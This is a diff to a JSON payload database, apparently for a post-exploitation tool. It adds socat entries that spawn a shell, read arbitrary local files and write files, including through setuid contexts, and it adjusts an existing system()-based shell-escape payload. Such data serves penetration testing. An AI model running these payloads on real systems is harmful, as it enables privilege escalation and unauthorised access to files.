@@ -11,6 +11,7 @@
 			"payload": "{command} 2>/dev/null",
 			// This is used to pass arguments to the application (auto-merged
 			// into "{command}".
+
 			// IF YOUR COMMAND TAKES ARGUMENTS, YOU MUST SUPPLY THEM HERE.
 			"args": ["if={lfile}"],
 			// Prepends arguments, if any to the "args" for setuid context.
@@ -261,13 +262,41 @@
 			"type": "shell",
 			"payload": "TF=$({mktemp}); echo 'system(\"{shell}\")' > $TF; {command}",
 			"args": ["--no-stop", "-q", "$TF"],
-			"exit": "exit"
+			"exit": "exit\n"
 		},
 		{
 			"type": "read",
 			"payload": "TF=$({mktemp}); echo 'system(\"{cat} {lfile}\")' > $TF; {command}",
 			"args": ["--no-stop", "-q", "$TF"],
-			"exit": "exit"
+			"exit": "exit\n"
 		}
+	],
+	"socat": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["STDIN", "EXEC:{shell}"],
+			"exit": "exit\n"
+		},
+		{
+			"type": "read",
+			"payload": "{command}",
+			"args": ["-u", "FILE:{lfile}", "STDOUT"]
+		},
+		{
+			"type": "write",
+			"stream": "print",
+			"payload": "{command} 2>/dev/null",
+			"args": ["-u", "STDIN", "CREATE:{lfile}"],
+			"exit": "{ctrl_d}"
+		},
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{base64} -d | {command} 2>/dev/null",
+			"args": ["-u", "STDIN", "CREATE:{lfile}"],
+			"exit": "{ctrl_d}"
+		}
+
 	]
 }
